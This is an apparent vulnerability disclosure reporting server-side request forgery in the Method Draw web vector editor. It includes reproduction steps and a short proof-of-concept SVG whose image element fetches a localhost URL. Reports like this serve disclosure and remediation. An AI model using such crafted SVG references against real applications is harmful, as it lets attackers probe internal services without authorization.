# :book: Description


 `Method Draw` is a web based vector drawing application.. This package is vulnerable for `(SSRF)`.

https://github.com/methodofaction/Method-Draw
https://editor.method.ac/
# :recycle:  Steps To Reproduce-:  
  0) download and run latest release from https://github.com/methodofaction/Method-Draw Or use demo https://editor.method.ac/
  1) open payload svg file . Payload used : `rc3.svg`
  ```
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:relative" width="300" height="200" overflow="hidden">
  <image x="10" y="10" width="276" height="110" xlink:href="http://localhost:8080/svg"/>
  <path d="M0 150h300v10H0z"/>
  </svg>
  ```

# :telescope: POC
https://drive.google.com/file/d/1pFEfdYStjGGj0wgvN8itpgYH8Al8Q_w5/view?usp=sharing
## 💥 Impact
SSRF
